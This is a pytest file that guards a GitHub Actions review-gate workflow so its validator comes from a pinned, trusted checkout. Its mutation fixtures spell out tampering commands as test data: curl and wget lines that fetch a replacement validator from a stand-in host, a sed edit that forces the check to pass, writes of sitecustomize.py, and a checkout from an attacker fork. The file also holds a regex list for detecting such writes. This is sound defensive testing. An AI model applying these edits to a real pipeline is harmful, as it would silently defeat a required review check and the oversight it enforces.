"""Regression guard: the Review Gate's judge must come from a pinned, trusted checkout (#170).

``.github/workflows/review-gate.yml`` is the required check for every repo wired
to org ruleset 12626210. Its "Checkout review-gate tooling" step fetches the
judge (``validate_review.py`` + ``review_formats.py``) from this repository.
When that step tracked a branch (``ref: main``), every merge here changed the
judge of other repos with no release step in between.
HO-REVIEW-GATE-PIN-RELEASE-20261025 pins it to the commit tagged
``review-gate-v1``.

These tests read the workflow as text with the stdlib only. The repository has
no YAML library and this guard does not justify adding one, so the step is
located by its ``- name:`` line and scoped by indentation.

Each guard is a function of the workflow text. ``MUTATIONS`` applies realistic
edits to the real workflow and asserts the named guard catches each one;
``EQUIVALENT_EDITS`` asserts that harmless rewrites are not rejected.
"""

from __future__ import annotations

import re
from collections.abc import Callable
from pathlib import Path

import pytest

WORKFLOW = Path(__file__).resolve().parents[1] / ".github" / "workflows" / "review-gate.yml"
STEP_NAME = "Checkout review-gate tooling"
FULL_SHA = re.compile(r"[0-9a-f]{40}")
EXPECTED_SPARSE = [
    "scripts/validate_review.py",
    "src/hestai_context_mcp/tools/shared/review_formats.py",
]
TRUSTED_ROOT = ".review-gate-tools"
TRUSTED_VALIDATOR = f"{TRUSTED_ROOT}/scripts/validate_review.py"

_STEP_NAME_LINE = re.compile(
    r"""^(?P<indent>\s*)-\s+(?P<q>['"]?)name(?P=q)\s*:\s*(?P<name>.+?)\s*$"""
)
# A path-like token naming the validator, in any spelling (file, module, absolute).
_VALIDATOR_REF = re.compile(r"""[^\s"'=()$;|&<>`]*validate_review[^\s"'();|&<>`]*""")
_SCRIPT_PATH_ASSIGN = re.compile(
    r"""(?:^|[\s;&|(])(?:(?:export|local|readonly|declare(?:\s+-\w+)*)\s+)?"""
    r"""SCRIPT_PATH\+?=(?P<value>"[^"]*"|'[^']*'|\S*)"""
)
_PYTHON_RUN = re.compile(r"""\bpython[0-9.]*\s+(?P<target>"[^"]*"|'[^']*'|\S+)""")
_CHDIR = re.compile(r"(?:^|[;&|(]\s*)(?:cd|pushd)\b")
_SCRIPT_PATH_VAR = {"$SCRIPT_PATH", "${SCRIPT_PATH}"}
_BLOCK_SCALAR = re.compile(r"[|>][-+0-9]*")
# Any mention of the trusted root, e.g. `.review-gate-tools`, `./.review-gate-tools/x`.
_TRUSTED_MENTION = re.compile(r"(?<![\w-])\.review-gate-tools(?![\w-])")
_INTO = r"""\s*["']?(?:[^\s"';&|]*/)?\.review-gate-tools(?![\w-])"""
_ARGS = r"[^;&|]*?"
# Shell forms that write into the trusted root (#215 rework 2, invariant b).
_RUN_WRITES = {
    "file command": re.compile(
        rf"\b(?:cp|mv|rm|ln|tee|install|rsync|touch|mkdir|truncate)\b{_ARGS}{_INTO}"
    ),
    "redirection": re.compile(rf"[0-9&]?>[>|]?{_INTO}"),
    "sed -i": re.compile(rf"\bsed\b{_ARGS}\s-i{_ARGS}{_INTO}"),
    "git -C": re.compile(rf"\bgit\b{_ARGS}(?:\s-C|\s--git-dir[=\s]|\s--work-tree[=\s]){_INTO}"),
    "cd": re.compile(rf"(?:^|[;&|(]\s*)(?:cd|pushd)\s{_INTO}"),
    "curl -o": re.compile(rf"\bcurl\b{_ARGS}(?:\s-[a-zA-Z]*o|\s--output[=\s]){_INTO}"),
    "wget -O": re.compile(
        rf"\bwget\b{_ARGS}(?:\s-[a-zA-Z]*[OP]|\s--output-document[=\s]|\s--directory-prefix[=\s])"
        rf"{_INTO}"
    ),
    "archive": re.compile(rf"\b(?:tar\b{_ARGS}\s-C|unzip\b{_ARGS}\s-d){_INTO}"),
}


def _workflow_text() -> str:
    return WORKFLOW.read_text(encoding="utf-8")


def _indent(line: str) -> int:
    return len(line) - len(line.lstrip(" "))


def _scalar(raw: str) -> str:
    """Strip an inline comment and surrounding quotes from a YAML scalar."""
    value = raw.split(" #", 1)[0].strip()
    if len(value) >= 2 and value[0] == value[-1] and value[0] in "'\"":
        value = value[1:-1]
    return value


def _key(raw: str) -> str:
    """Normalise a mapping key: YAML reads ``if``, ``'if'``, ``"if"`` and ``if :`` alike."""
    return _scalar(raw)


def _split_key(line: str) -> tuple[int, str, str] | None:
    """``(key indent, normalised key, raw value)`` of a mapping line; ``- `` items allowed."""
    if not line.strip() or line.lstrip().startswith("#"):
        return None
    indent = _indent(line)
    rest = line[indent:]
    if rest.startswith("- "):
        after = rest[2:]
        indent += 2 + _indent(after)
        rest = after.lstrip(" ")
    key, sep, value = rest.partition(":")
    if not sep:
        return None
    return indent, _key(key), value


def _block_bodies(lines: list[str], key: str) -> list[list[tuple[int, str]]]:
    """Code lines ``(index, text)`` under every ``key:`` (block scalar or one-line value)."""
    bodies: list[list[tuple[int, str]]] = []
    i = 0
    while i < len(lines):
        parsed = _split_key(lines[i])
        i += 1
        if parsed is None or parsed[1] != key:
            continue
        key_indent, _, raw = parsed
        value = _scalar(raw)
        if not re.fullmatch(r"[|>][-+0-9]*", value):
            bodies.append([(i - 1, value)] if value else [])
            continue
        body: list[tuple[int, str]] = []
        while i < len(lines) and (not lines[i].strip() or _indent(lines[i]) > key_indent):
            code = lines[i].strip()
            if code and not code.startswith("#"):
                body.append((i, code))
            i += 1
        bodies.append(body)
    return bodies


def _tooling_step_span(text: str) -> range:
    """Line indices of the one step named STEP_NAME, ``- name:`` line included."""
    lines = text.splitlines()
    starts = [
        (i, len(m.group("indent")))
        for i, line in enumerate(lines)
        if (m := _STEP_NAME_LINE.match(line)) and _scalar(m.group("name")) == STEP_NAME
    ]
    assert len(starts) == 1, f"expected exactly one step named {STEP_NAME!r}, found {len(starts)}"
    start, dash_indent = starts[0]
    end = len(lines)
    for j in range(start + 1, len(lines)):
        line = lines[j]
        if line.strip() and not line.lstrip().startswith("#") and _indent(line) <= dash_indent:
            end = j
            break
    return range(start, end)


def _tooling_step_lines(text: str) -> list[str]:
    span = _tooling_step_span(text)
    return text.splitlines()[span.start : span.stop]


def _step_keys(step: list[str]) -> dict[str, str]:
    """Top-level keys of the step (the ``- name:`` line counts as ``name``)."""
    key_indent = _indent(step[0]) + 2
    keys: dict[str, str] = {"name": _scalar(step[0].split(":", 1)[1])}
    for line in step[1:]:
        if not line.strip() or line.lstrip().startswith("#") or _indent(line) != key_indent:
            continue
        key, _, value = line.strip().partition(":")
        keys[_key(key)] = value
    return keys


def _with_block(step: list[str]) -> tuple[dict[str, str], dict[str, list[str]]]:
    """Scalars and block-scalar (``|``) lists inside the step's ``with:`` mapping."""
    key_indent = _indent(step[0]) + 2
    with_at = next(
        (
            i
            for i, line in enumerate(step)
            if _indent(line) == key_indent
            and (parsed := _split_key(line)) is not None
            and parsed[1] == "with"
            and not _scalar(parsed[2])
        ),
        None,
    )
    assert with_at is not None, f"step {STEP_NAME!r} has no with: mapping"
    scalars: dict[str, str] = {}
    blocks: dict[str, list[str]] = {}
    body = step[with_at + 1 :]
    arg_indent = next((_indent(line) for line in body if line.strip()), None)
    assert arg_indent is not None and arg_indent > key_indent, "with: mapping is empty"
    i = 0
    while i < len(body):
        line = body[i]
        i += 1
        if not line.strip() or line.lstrip().startswith("#"):
            continue
        if _indent(line) < arg_indent:
            break
        if _indent(line) != arg_indent:
            continue
        key, _, value = line.strip().partition(":")
        key = _key(key)
        if _scalar(value) == "|":
            items: list[str] = []
            while i < len(body) and (not body[i].strip() or _indent(body[i]) > arg_indent):
                if body[i].strip():
                    items.append(body[i].strip())
                i += 1
            blocks[key] = items
        else:
            scalars[key] = _scalar(value)
    return scalars, blocks


# --- Guards: each raises AssertionError when the workflow violates its rule ---


def _guard_repository(text: str) -> None:
    scalars, _ = _with_block(_tooling_step_lines(text))
    assert scalars.get("repository") == "elevanaltd/hestai-context-mcp"


def _guard_ref(text: str) -> None:
    """A branch or tag name is mutable; only a full 40-hex SHA is immutable."""
    scalars, _ = _with_block(_tooling_step_lines(text))
    ref = scalars.get("ref", "")
    assert FULL_SHA.fullmatch(
        ref
    ), f"tooling checkout ref must be a full 40-char lowercase hex commit SHA, got {ref!r}"


def _guard_unconditional(text: str) -> None:
    """An if: here once let this repo's PRs be judged by their own tree (#116 P0-1)."""
    keys = _step_keys(_tooling_step_lines(text))
    assert "if" not in keys, f"step {STEP_NAME!r} must not carry an if: key"


def _guard_sparse(text: str) -> None:
    _, blocks = _with_block(_tooling_step_lines(text))
    assert blocks.get("sparse-checkout") == EXPECTED_SPARSE


def _resolves_to_trusted_root(value: str) -> bool:
    """``.review-gate-tools``, ``./.review-gate-tools`` and ``.review-gate-tools/`` are one path."""
    path = _scalar(value)
    while path.startswith("./"):
        path = path[2:]
    return path.rstrip("/") == TRUSTED_ROOT


def _guard_tooling_path(text: str) -> None:
    """The trusted judge lands where the validator invocation looks for it."""
    scalars, _ = _with_block(_tooling_step_lines(text))
    assert _resolves_to_trusted_root(scalars.get("path", ""))


def _steps(lines: list[str]) -> list[range]:
    """Line spans of every list item under every ``steps:`` key, in file order."""
    spans: list[range] = []
    i = 0
    while i < len(lines):
        parsed = _split_key(lines[i])
        i += 1
        if parsed is None or parsed[1] != "steps" or _scalar(parsed[2]):
            continue
        key_indent, dash, start = parsed[0], None, None
        while i < len(lines):
            line = lines[i]
            if line.strip() and not line.lstrip().startswith("#"):
                if _indent(line) <= key_indent:
                    break
                dash = _indent(line) if dash is None else dash
                if _indent(line) == dash and line.lstrip().startswith("-"):
                    if start is not None:
                        spans.append(range(start, i))
                    start = i
            i += 1
        if start is not None:
            spans.append(range(start, i))
    return spans


def _run_lines(lines: list[str]) -> dict[int, str]:
    return {i: code for body in _block_bodies(lines, "run") for i, code in body}


def _run_write(code: str) -> str | None:
    """Name of the first write form in a shell line that targets the trusted root."""
    if not _TRUSTED_MENTION.search(code):
        return None
    return next((name for name, form in _RUN_WRITES.items() if form.search(code)), None)


def _guard_single_writer(text: str) -> None:
    """(a) Exactly one step targets the trusted root: the pinned tooling checkout."""
    lines = text.splitlines()
    writers = []
    for span in _steps(lines):
        for i in span:
            parsed = _split_key(lines[i])
            if parsed is None or parsed[1] != "path":
                continue
            values = [parsed[2]]
            if _BLOCK_SCALAR.fullmatch(_scalar(parsed[2])):
                values = [
                    lines[j]
                    for j in range(i + 1, span.stop)
                    if lines[j].strip() and _indent(lines[j]) > parsed[0]
                ]
            if any(_resolves_to_trusted_root(v) for v in values):
                writers.append(span)
                break
    assert len(writers) == 1, f"{len(writers)} steps target {TRUSTED_ROOT}; only one may"
    assert writers[0] == _tooling_step_span(text), f"the {TRUSTED_ROOT} writer is not {STEP_NAME!r}"
    _guard_ref(text)


def _guard_no_run_writes(text: str) -> None:
    """(b) No run body writes into the trusted root; reads stay allowed."""
    for i, code in _run_lines(text.splitlines()).items():
        form = _run_write(code)
        assert form is None, f"line {i + 1} writes into {TRUSTED_ROOT} ({form}): {code!r}"


def _guard_order(text: str) -> None:
    """(c) Between the pinned checkout and the validator run, the judge is only ever read."""
    lines = text.splitlines()
    steps = _steps(lines)
    run_lines = _run_lines(lines)
    tooling_span = _tooling_step_span(text)
    assert tooling_span in steps, f"{STEP_NAME!r} is not a list item under steps:"
    tooling = steps.index(tooling_span)

    def invokes_validator(span: range) -> bool:
        for i in span:
            code = run_lines.get(i, "")
            if re.match(r"(?:echo|printf)\b", code):
                continue
            for m in _PYTHON_RUN.finditer(code):
                target = m["target"].strip("\"'")
                if target in _SCRIPT_PATH_VAR or "validate_review" in target:
                    return True
        return False

    validators = [k for k, span in enumerate(steps) if invokes_validator(span)]
    assert len(validators) == 1, f"expected one step to run the validator, found {len(validators)}"
    assert tooling < validators[0], f"{STEP_NAME!r} must run before the validator"
    for span in steps[tooling + 1 : validators[0]]:
        for i in span:
            line = lines[i]
            if line.lstrip().startswith("#") or not _TRUSTED_MENTION.search(line):
                continue
            assert i in run_lines, f"line {i + 1} names {TRUSTED_ROOT} outside a run body"
            assert _run_write(run_lines[i]) is None, f"line {i + 1} writes into {TRUSTED_ROOT}"


def _guard_validator_invocation(text: str) -> None:
    """The validator runs from the trusted checkout only (#170 item 2).

    validate_review.py loads review_formats.py from its own directory, so pinning
    where the script runs from pins both halves of the judge.
    """
    lines = text.splitlines()
    exempt = set(_tooling_step_span(text))  # the sparse list names the PR-relative path
    exempt |= {i for body in _block_bodies(lines, "script") for i, _ in body}  # JS, not shell
    for i, line in enumerate(lines):
        if i in exempt or line.lstrip().startswith("#"):
            continue
        for ref in _VALIDATOR_REF.findall(line):
            assert ref == TRUSTED_VALIDATOR, f"line {i + 1} names the validator as {ref!r}"
        # A relative SCRIPT_PATH resolves against the cwd, and an env-supplied one is not ours.
        if (parsed := _split_key(line)) is not None:
            assert parsed[1] not in {
                "working-directory",
                "SCRIPT_PATH",
            }, f"line {i + 1} sets {parsed[1]!r}"
    runs = 0
    for body in _block_bodies(lines, "run"):
        assigned = False
        body_runs = 0
        for i, code in body:
            for m in _SCRIPT_PATH_ASSIGN.finditer(code):
                value = _scalar(m["value"])
                assert value == TRUSTED_VALIDATOR, f"line {i + 1} sets SCRIPT_PATH to {value!r}"
                assigned = True
            if re.match(r"(?:echo|printf)\b", code):
                continue
            for m in _PYTHON_RUN.finditer(code):
                target = m["target"].strip("\"'")
                if target in _SCRIPT_PATH_VAR:
                    assert assigned, f"line {i + 1} runs $SCRIPT_PATH before assigning it"
                else:
                    assert target == TRUSTED_VALIDATOR, f"line {i + 1} runs python on {target!r}"
                body_runs += 1
        assert not (
            body_runs and any(_CHDIR.search(code) for _, code in body)
        ), "a run block that invokes the validator changes directory"
        runs += body_runs
    assert runs >= 1, "no run block invokes the validator"


GUARDS: dict[str, Callable[[str], None]] = {
    "repository": _guard_repository,
    "ref": _guard_ref,
    "unconditional": _guard_unconditional,
    "sparse": _guard_sparse,
    "tooling_path": _guard_tooling_path,
    "validator_invocation": _guard_validator_invocation,
    "single_writer": _guard_single_writer,
    "no_run_writes": _guard_no_run_writes,
    "order": _guard_order,
}


def _guards_tripped(text: str) -> list[str]:
    tripped = []
    for name, guard in GUARDS.items():
        try:
            guard(text)
        except AssertionError:
            tripped.append(name)
    return tripped


# --- Mutations of the real workflow ---

Mutation = Callable[[str], str]


def _sub(old: str, new: str) -> Mutation:
    def apply(text: str) -> str:
        assert text.count(old) == 1, f"mutation anchor must occur exactly once: {old!r}"
        return text.replace(old, new)

    return apply


def _sub_re(pattern: str, repl: str | Callable[[re.Match[str]], str]) -> Mutation:
    def apply(text: str) -> str:
        mutated, count = re.subn(pattern, repl, text, flags=re.MULTILINE)
        assert count == 1, f"mutation pattern must match exactly once: {pattern!r}"
        return mutated

    return apply


def _chain(*mutations: Mutation) -> Mutation:
    def apply(text: str) -> str:
        for mutation in mutations:
            text = mutation(text)
        return text

    return apply


_NAME = "      - name: Checkout review-gate tooling\n"
_CONE = "          sparse-checkout-cone-mode: false\n"
_REF = r"^(?P<lead>\s+)ref:(?P<gap>\s*)(?P<sha>[0-9a-f]{40})[ \t]*$"
_SCRIPT_PATH = '          SCRIPT_PATH=".review-gate-tools/scripts/validate_review.py"\n'
_RUN = '          OUTPUT=$(python3 "$SCRIPT_PATH" 2>&1)\n'
_SETUP = "      - name: Set up Python\n"  # first step after the tooling checkout
_UPDATE = "      - name: Update PR Status\n"  # first step after the validator run
_TOOLING_PATH = "          path: .review-gate-tools\n"


def _step_before(anchor: str, step: str) -> Mutation:
    return _sub(anchor, step + anchor)


def _before_run(line: str) -> Mutation:
    """Insert one shell line into the validator's run block, just before it runs."""
    return _sub(_RUN, f"          {line}\n" + _RUN)


def _checkout_into(path_line: str, *, ref: str = "main") -> str:
    return (
        "      - name: Replace tooling checkout\n"
        "        uses: actions/checkout@v4\n"
        "        with:\n"
        "          repository: 'elevanaltd/hestai-context-mcp'\n"
        f"          ref: {ref}\n"
        f"          {path_line}\n"
        "\n"
    )


def _move_tooling_after_validator(text: str) -> str:
    lines = text.splitlines(keepends=True)
    span = _tooling_step_span(text)
    block, rest = lines[span.start : span.stop], lines[: span.start] + lines[span.stop :]
    assert rest.count(_UPDATE) == 1, f"mutation anchor must occur exactly once: {_UPDATE!r}"
    at = rest.index(_UPDATE)
    return "".join(rest[:at] + block + rest[at:])


MUTATIONS = [
    # ref: anything but a full lowercase SHA
    pytest.param(_sub_re(_REF, r"\g<lead>ref: main"), "ref", id="ref-branch"),
    pytest.param(_sub_re(_REF, r"\g<lead>ref: review-gate-v1"), "ref", id="ref-tag-name"),
    pytest.param(
        _sub_re(_REF, lambda m: f"{m['lead']}ref: {m['sha'].upper()}"), "ref", id="ref-uppercase"
    ),
    pytest.param(
        _sub_re(_REF, lambda m: f"{m['lead']}ref: {m['sha'][:12]}"), "ref", id="ref-short-sha"
    ),
    pytest.param(_sub_re(_REF, r"\g<lead>ref: 'main'"), "ref", id="ref-quoted-branch"),
    pytest.param(
        _sub_re(_REF, r"\g<lead>ref: ${{ github.event.pull_request.head.sha }}"),
        "ref",
        id="ref-pr-head-expression",
    ),
    pytest.param(_sub_re(_REF + r"\n", ""), "ref", id="ref-removed"),
    pytest.param(_sub_re(_REF, r"\g<lead>'ref': main"), "ref", id="ref-quoted-key-branch"),
    # repository
    pytest.param(
        _sub(
            "repository: elevanaltd/hestai-context-mcp", "repository: attacker/hestai-context-mcp"
        ),
        "repository",
        id="repository-fork",
    ),
    pytest.param(
        _sub(
            "repository: elevanaltd/hestai-context-mcp",
            '"repository": attacker/hestai-context-mcp',
        ),
        "repository",
        id="repository-quoted-key-fork",
    ),
    # if: on the tooling checkout, in every key spelling YAML accepts
    pytest.param(_sub(_NAME, _NAME + "        if: false\n"), "unconditional", id="if-first-key"),
    pytest.param(_sub(_CONE, _CONE + "        if: always()\n"), "unconditional", id="if-last-key"),
    pytest.param(
        _sub(_NAME, _NAME + "        'if': false\n"), "unconditional", id="if-single-quoted-key"
    ),
    pytest.param(
        _sub(_NAME, _NAME + '        "if": false\n'), "unconditional", id="if-double-quoted-key"
    ),
    pytest.param(
        _sub(_NAME, _NAME + "        if : false\n"), "unconditional", id="if-space-before-colon"
    ),
    pytest.param(
        _sub(_NAME, "      - if: false\n        name: Checkout review-gate tooling\n"),
        "unconditional",
        id="if-before-name",
    ),
    # sparse set
    pytest.param(
        _sub(
            "            src/hestai_context_mcp/tools/shared/review_formats.py\n",
            "            src/hestai_context_mcp/tools/shared/review_formats.py\n"
            "            tests/\n",
        ),
        "sparse",
        id="sparse-extra-path",
    ),
    pytest.param(
        _sub("            scripts/validate_review.py\n", ""),
        "sparse",
        id="sparse-missing-validator",
    ),
    # where the trusted checkout lands
    pytest.param(
        _sub("          path: .review-gate-tools\n", "          path: .tools\n"),
        "tooling_path",
        id="tooling-path-changed",
    ),
    pytest.param(
        _sub("          path: .review-gate-tools\n", "          'path': .tools\n"),
        "tooling_path",
        id="tooling-path-quoted-key",
    ),
    # validator invocation redirected away from the trusted checkout
    pytest.param(
        _sub(_SCRIPT_PATH, '          SCRIPT_PATH="scripts/validate_review.py"\n'),
        "validator_invocation",
        id="script-path-pr-tree",
    ),
    pytest.param(
        _sub(
            _SCRIPT_PATH,
            '          SCRIPT_PATH=".review-gate-tools/../scripts/validate_review.py"\n',
        ),
        "validator_invocation",
        id="script-path-traversal",
    ),
    pytest.param(
        _sub(
            _SCRIPT_PATH, '          SCRIPT_PATH="$GITHUB_WORKSPACE/scripts/validate_review.py"\n'
        ),
        "validator_invocation",
        id="script-path-workspace-root",
    ),
    pytest.param(
        _sub(
            _SCRIPT_PATH,
            _SCRIPT_PATH + '          SCRIPT_PATH="${SCRIPT_PATH#.review-gate-tools/}"\n',
        ),
        "validator_invocation",
        id="script-path-reassigned",
    ),
    pytest.param(
        _sub(_SCRIPT_PATH, ""), "validator_invocation", id="script-path-assignment-removed"
    ),
    pytest.param(
        _chain(
            _sub(_SCRIPT_PATH, ""),
            _sub(
                "          CI: true\n", "          CI: true\n          SCRIPT_PATH: scripts/x.py\n"
            ),
        ),
        "validator_invocation",
        id="script-path-from-env",
    ),
    pytest.param(
        _sub(_RUN, "          OUTPUT=$(python3 scripts/validate_review.py 2>&1)\n"),
        "validator_invocation",
        id="run-line-pr-tree",
    ),
    pytest.param(
        _sub(_RUN, "          OUTPUT=$(python3 -m scripts.validate_review 2>&1)\n"),
        "validator_invocation",
        id="run-line-module",
    ),
    pytest.param(
        _sub(_RUN, '          OUTPUT=$(python3 "$JUDGE" 2>&1)\n'),
        "validator_invocation",
        id="run-line-other-variable",
    ),
    pytest.param(
        _sub(_RUN, _RUN + "          python3 scripts/validate_review.py || true\n"),
        "validator_invocation",
        id="extra-pr-tree-invocation",
    ),
    pytest.param(_sub(_RUN, ""), "validator_invocation", id="invocation-removed"),
    pytest.param(
        _sub(_RUN, '          cd "$RUNNER_TEMP"\n' + _RUN),
        "validator_invocation",
        id="cd-before-invocation",
    ),
    pytest.param(
        _sub(
            "        id: review_check\n",
            "        id: review_check\n        working-directory: sub\n",
        ),
        "validator_invocation",
        id="working-directory-on-step",
    ),
    pytest.param(
        _sub(
            "    runs-on: ubuntu-latest\n",
            "    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: sub\n",
        ),
        "validator_invocation",
        id="defaults-working-directory",
    ),
    # (a) single writer: only the pinned tooling step may target .review-gate-tools
    pytest.param(
        _step_before(_SETUP, _checkout_into("path: '.review-gate-tools'")),
        "single_writer",
        id="second-checkout-quoted-values",
    ),
    pytest.param(
        _step_before(_SETUP, _checkout_into("path: ./.review-gate-tools")),
        "single_writer",
        id="second-checkout-dot-slash",
    ),
    pytest.param(
        _step_before(_SETUP, _checkout_into('path: ".review-gate-tools/"')),
        "single_writer",
        id="second-checkout-trailing-slash",
    ),
    pytest.param(
        _step_before(_SETUP, _checkout_into('"path": .review-gate-tools')),
        "single_writer",
        id="second-checkout-quoted-key",
    ),
    pytest.param(
        _step_before(
            _SETUP,
            _checkout_into(
                "path: .review-gate-tools", ref="7153bfd1e788f342617d258e978edbf577550e8f"
            ),
        ),
        "single_writer",
        id="second-checkout-same-sha",
    ),
    pytest.param(
        _step_before(_NAME, _checkout_into("path: .review-gate-tools")),
        "single_writer",
        id="second-checkout-before-tooling",
    ),
    pytest.param(
        _step_before(_UPDATE, _checkout_into("path: .review-gate-tools")),
        "single_writer",
        id="second-checkout-after-validator",
    ),
    pytest.param(
        _step_before(
            _SETUP,
            "      - name: Fetch judge\n"
            "        uses: actions/download-artifact@v4\n"
            "        with:\n"
            "          name: judge\n"
            "          path: .review-gate-tools\n"
            "\n",
        ),
        "single_writer",
        id="download-artifact-into-trusted",
    ),
    # (b) no run body writes into .review-gate-tools
    pytest.param(
        _before_run('cp -r "$RUNNER_TEMP/judge/." .review-gate-tools/'),
        "no_run_writes",
        id="run-cp",
    ),
    pytest.param(
        _before_run('mv "$RUNNER_TEMP/judge" .review-gate-tools/scripts'),
        "no_run_writes",
        id="run-mv",
    ),
    pytest.param(_before_run("rm -rf .review-gate-tools/scripts"), "no_run_writes", id="run-rm"),
    pytest.param(
        _before_run('ln -sfn "$PWD/scripts" .review-gate-tools/scripts'),
        "no_run_writes",
        id="run-ln",
    ),
    pytest.param(
        _before_run("tee .review-gate-tools/scripts/sitecustomize.py < /dev/null"),
        "no_run_writes",
        id="run-tee",
    ),
    pytest.param(
        _before_run("echo 'import os' > .review-gate-tools/scripts/sitecustomize.py"),
        "no_run_writes",
        id="run-redirect",
    ),
    pytest.param(
        _before_run("printf 'x' >> ./.review-gate-tools/scripts/sitecustomize.py"),
        "no_run_writes",
        id="run-append",
    ),
    pytest.param(
        _before_run("git -C .review-gate-tools fetch origin main"),
        "no_run_writes",
        id="run-git-dash-c",
    ),
    pytest.param(
        _step_before(
            _SETUP,
            "      - name: Refresh tools\n"
            "        run: |\n"
            "          cd .review-gate-tools\n"
            "          git checkout main\n"
            "\n",
        ),
        "no_run_writes",
        id="run-cd-then-write",
    ),
    pytest.param(
        _before_run(
            "curl -sSfL https://example.invalid/v.py -o .review-gate-tools/scripts/validate_review.py"
        ),
        "no_run_writes",
        id="run-curl-o",
    ),
    pytest.param(
        _before_run(
            "wget -q -O .review-gate-tools/scripts/validate_review.py https://example.invalid/v.py"
        ),
        "no_run_writes",
        id="run-wget-o",
    ),
    pytest.param(
        _before_run("sed -i 's/exit 1/exit 0/' .review-gate-tools/scripts/validate_review.py"),
        "no_run_writes",
        id="run-sed-in-place",
    ),
    # (c) order: nothing between the pinned checkout and the validator run touches the judge
    pytest.param(
        _step_before(
            _SETUP,
            "      - name: Sync tools\n"
            "        uses: example/sync-action@v1\n"
            "        with:\n"
            "          destination: .review-gate-tools\n"
            "\n",
        ),
        "order",
        id="between-step-action-input",
    ),
    pytest.param(
        _step_before(
            _SETUP,
            "      - name: Patch judge\n"
            "        uses: actions/github-script@v7\n"
            "        with:\n"
            "          script: |\n"
            "            require('fs').writeFileSync('.review-gate-tools/scripts/x.py', '')\n"
            "\n",
        ),
        "order",
        id="between-step-github-script",
    ),
    pytest.param(
        _sub(
            "          python-version: '3.11'\n",
            "          python-version: '3.11'\n        env:\n          PIP_TARGET: .review-gate-tools\n",
        ),
        "order",
        id="between-step-env",
    ),
    pytest.param(_move_tooling_after_validator, "order", id="tooling-after-validator"),
]

EQUIVALENT_EDITS = [
    pytest.param(_sub_re(_REF, r"\g<lead>'ref': \g<sha>"), id="ref-quoted-key"),
    pytest.param(_sub_re(_REF, r'\g<lead>ref: "\g<sha>"'), id="ref-quoted-value"),
    pytest.param(
        _sub(
            "repository: elevanaltd/hestai-context-mcp",
            "'repository': elevanaltd/hestai-context-mcp",
        ),
        id="repository-quoted-key",
    ),
    pytest.param(
        _sub(
            _RUN, "          OUTPUT=$(python3 .review-gate-tools/scripts/validate_review.py 2>&1)\n"
        ),
        id="run-line-trusted-literal",
    ),
    pytest.param(
        _sub(_RUN, '          OUTPUT=$(python3 "${SCRIPT_PATH}" 2>&1)\n'), id="run-line-braced"
    ),
    pytest.param(
        _sub(_TOOLING_PATH, "          path: '.review-gate-tools'\n"), id="tooling-path-quoted"
    ),
    pytest.param(
        _sub(_TOOLING_PATH, "          path: ./.review-gate-tools\n"), id="tooling-path-dot-slash"
    ),
    pytest.param(
        _sub(_TOOLING_PATH, "          path: .review-gate-tools/\n"),
        id="tooling-path-trailing-slash",
    ),
    pytest.param(
        _before_run("sha256sum .review-gate-tools/scripts/validate_review.py"),
        id="validator-step-read",
    ),
    pytest.param(
        _step_before(_SETUP, "      - name: Show tools\n        run: ls -R .review-gate-tools\n\n"),
        id="between-step-read-only",
    ),
]


@pytest.mark.unit
@pytest.mark.parametrize("guard", list(GUARDS))
def test_guard_holds_on_current_workflow(guard: str) -> None:
    GUARDS[guard](_workflow_text())


@pytest.mark.unit
@pytest.mark.parametrize(("mutate", "expected_guard"), MUTATIONS)
def test_mutation_is_caught(mutate: Mutation, expected_guard: str) -> None:
    tripped = _guards_tripped(mutate(_workflow_text()))
    assert (
        expected_guard in tripped
    ), f"mutation slipped past the {expected_guard!r} guard; guards that fired: {tripped}"


@pytest.mark.unit
@pytest.mark.parametrize("mutate", EQUIVALENT_EDITS)
def test_equivalent_edit_is_accepted(mutate: Mutation) -> None:
    assert _guards_tripped(mutate(_workflow_text())) == []
